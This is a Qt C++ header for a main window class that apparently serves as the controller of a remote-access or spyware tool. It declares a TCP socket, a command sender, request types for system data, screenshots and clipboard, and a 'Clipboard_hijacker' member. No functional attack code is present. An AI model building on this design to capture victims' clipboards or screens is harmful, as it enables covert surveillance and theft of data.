#ifndef MAINWINDOW_H
#define MAINWINDOW_H
#include <QFileDialog>
#include <QJsonObject>
#include <QJsonArray>
#include <QFile>
#include <QTableWidgetItem>
#include <QJsonDocument>
#include <QTcpSocket>
#include <QMessageBox>
#include <clipboard_hijacker.h>
#include <QtGui>
#include <QLabel>
#include <QDebug>
#include <QApplication>
#include "clipboard_hijacker.h"
#include "screen_saver.h"
#include "unistd.h"
#include <QtTest/QTest>

#include <QMainWindow>

QT_BEGIN_NAMESPACE
namespace Ui { class MainWindow; }
QT_END_NAMESPACE
enum DATA_REQUESTER:int {SYS=0, SCR=1, EXT=2, CLP=3, NIL=4};

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);
    ~MainWindow();
    void sendCmd(QString);

private slots:
    //void commandReceived();
    void read();
private:
    QTcpSocket *clientSocket;
    QDataStream in;
    DATA_REQUESTER networdHandler;
    Clipboard_hijacker *clippy = new Clipboard_hijacker();
    Ui::MainWindow *ui;
};
#endif // MAINWINDOW_H
